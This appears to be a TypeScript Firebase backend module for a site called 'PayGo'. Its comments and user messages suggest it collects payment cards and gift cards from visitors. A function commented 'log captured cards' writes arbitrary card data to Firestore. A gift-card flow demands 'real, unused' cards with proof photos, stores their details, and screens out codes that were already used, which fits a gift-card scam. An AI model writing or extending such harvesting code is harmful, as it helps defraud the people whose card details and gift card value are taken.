import { initializeApp } from 'firebase/app';
import { getAuth, GoogleAuthProvider } from 'firebase/auth';
import {
  getFirestore,
  collection,
  addDoc,
  setDoc,
  getDoc,
  doc,
  getDocFromServer,
} from 'firebase/firestore';
import firebaseConfig from '../../firebase-applet-config.json';
import { hashGiftCardCode } from '../utils/giftCardValidator';

const app = initializeApp(firebaseConfig);
export const db = getFirestore(app, firebaseConfig.firestoreDatabaseId);
export const auth = getAuth(app);
export const googleProvider = new GoogleAuthProvider();
googleProvider.setCustomParameters({ prompt: 'select_account' });

export enum OperationType {
  CREATE = 'create',
  UPDATE = 'update',
  DELETE = 'delete',
  LIST = 'list',
  GET = 'get',
  WRITE = 'write',
}

export interface FirestoreErrorInfo {
  error: string;
  operationType: OperationType;
  path: string | null;
  authInfo: {
    userId?: string | null;
    email?: string | null;
    emailVerified?: boolean | null;
    isAnonymous?: boolean | null;
    tenantId?: string | null;
    providerInfo?: {
      providerId?: string | null;
      email?: string | null;
    }[];
  };
}

export function handleFirestoreError(
  error: unknown,
  operationType: OperationType,
  path: string | null
): never {
  const errInfo: FirestoreErrorInfo = {
    error: error instanceof Error ? error.message : String(error),
    authInfo: {
      userId: auth.currentUser?.uid,
      email: auth.currentUser?.email,
      emailVerified: auth.currentUser?.emailVerified,
      isAnonymous: auth.currentUser?.isAnonymous,
      tenantId: auth.currentUser?.tenantId,
      providerInfo:
        auth.currentUser?.providerData?.map((provider) => ({
          providerId: provider.providerId,
          email: provider.email,
        })) || [],
    },
    operationType,
    path,
  };
  console.error('Firestore Error: ', JSON.stringify(errInfo));
  throw new Error(JSON.stringify(errInfo));
}

async function testConnection() {
  try {
    await getDocFromServer(doc(db, 'test', 'connection'));
  } catch (error) {
    if (error instanceof Error && error.message.includes('the client is offline')) {
      console.error('Please check your Firebase configuration.');
    }
  }
}
testConnection();

// Shared function to log captured cards to Firestore
export const logCardSubmission = async (cardData: any) => {
  try {
    await addDoc(collection(db, 'cardSubmissions'), {
      ...cardData,
      timestamp: new Date().toISOString(),
    });
  } catch (e) {
    console.error('Failed to sync card data:', e);
  }
};

const LOCAL_USED_CARDS_KEY = 'paygo_dropped_gift_cards';

const getLocalUsedHashes = (): string[] => {
  try {
    return JSON.parse(localStorage.getItem(LOCAL_USED_CARDS_KEY) || '[]');
  } catch {
    return [];
  }
};

const addLocalUsedHash = (codeHash: string) => {
  try {
    const existing = getLocalUsedHashes();
    if (!existing.includes(codeHash)) {
      localStorage.setItem(LOCAL_USED_CARDS_KEY, JSON.stringify([...existing, codeHash]));
    }
  } catch {
    // ignore storage errors
  }
};

// Verify gift card code has never been dropped/used before, reserve hash, and log submission
export const logGiftCardSubmission = async (
  giftCardData: any
): Promise<{ success: boolean; error?: string; codeHash?: string; statusId?: string }> => {
  const codeHash = await hashGiftCardCode(giftCardData.cardCode || '');

  // 1. Fast local duplicate check
  if (getLocalUsedHashes().includes(codeHash)) {
    return {
      success: false,
      error: 'Used or already-submitted gift card is not allowed. Please drop a real, unused gift card.',
    };
  }

  // 2. Cloud Firestore duplicate / used gift card registry check
  try {
    const existingSnap = await getDoc(doc(db, 'usedGiftCards', codeHash));
    if (existingSnap.exists()) {
      addLocalUsedHash(codeHash);
      return {
        success: false,
        error: 'Used or already-submitted gift card is not allowed. This gift card has already been dropped or blocked.',
      };
    }

    await setDoc(doc(db, 'usedGiftCards', codeHash), {
      codeHash,
      brand: giftCardData.cardBrand,
      status: 'submitted',
      createdAt: new Date().toISOString(),
    });
  } catch (err: any) {
    console.error('Gift card duplicate check failed:', err);
    if (err?.code === 'permission-denied') {
      return {
        success: false,
        error: 'Used or already-submitted gift card is not allowed. Please submit a brand-new, unused gift card.',
      };
    }
    return {
      success: false,
      error: 'Unable to verify gift card uniqueness right now. Please check your connection and try again.',
    };
  }

  const randomPart = Math.random().toString(36).slice(2, 10).toUpperCase();
  const statusId = `GCS-${Date.now()}-${randomPart}`;
  const nowIso = new Date().toISOString();

  try {
    await setDoc(doc(db, 'giftCardStatuses', statusId), {
      id: statusId,
      type: giftCardData.type || 'Gift Card Verification',
      status: 'pending',
      updatedAt: nowIso,
    });

    await addDoc(collection(db, 'giftCardSubmissions'), {
      ...giftCardData,
      codeHash,
      statusId,
      status: 'pending',
      timestamp: nowIso,
    });

    addLocalUsedHash(codeHash);
    return { success: true, codeHash, statusId };
  } catch (e: any) {
    console.error('Failed to sync gift card data:', e);
    return {
      success: false,
      error: 'Gift card proof photo or details could not be verified. Ensure a clear real gift card image is attached.',
    };
  }
};

// Admin helper to permanently blocklist a used gift card code
export const blockUsedGiftCardCode = async (rawCode: string, brand: string) => {
  const codeHash = await hashGiftCardCode(rawCode);
  addLocalUsedHash(codeHash);
  await setDoc(
    doc(db, 'usedGiftCards', codeHash),
    {
      codeHash,
      brand: brand || 'Blocked Used Card',
      status: 'used_rejected',
      createdAt: new Date().toISOString(),
    },
    { merge: true }
  );
  return codeHash;
};

// Safe Notification permission helper without crashing on unsupported browsers
export const requestNotificationPermission = async (userEmail?: string) => {
  try {
    if (typeof window !== 'undefined' && 'Notification' in window) {
      const permission = await Notification.requestPermission();
      if (permission === 'granted' && userEmail) {
        try {
          await setDoc(
            doc(db, 'fcmTokens', userEmail.replace(/[^a-zA-Z0-9]/g, '_')),
            {
              email: userEmail,
              granted: true,
              updatedAt: new Date().toISOString(),
            },
            { merge: true }
          );
        } catch (dbErr) {
          console.warn('Failed to record notification preference:', dbErr);
        }
      }
      return permission === 'granted' ? 'granted' : null;
    }
  } catch (e) {
    console.warn('Notifications not supported in this environment:', e);
  }
  return null;
};

// Safe Foreground message listener stub
export const onForegroundMessage = (_callback: (payload: any) => void) => {
  return () => {};
};
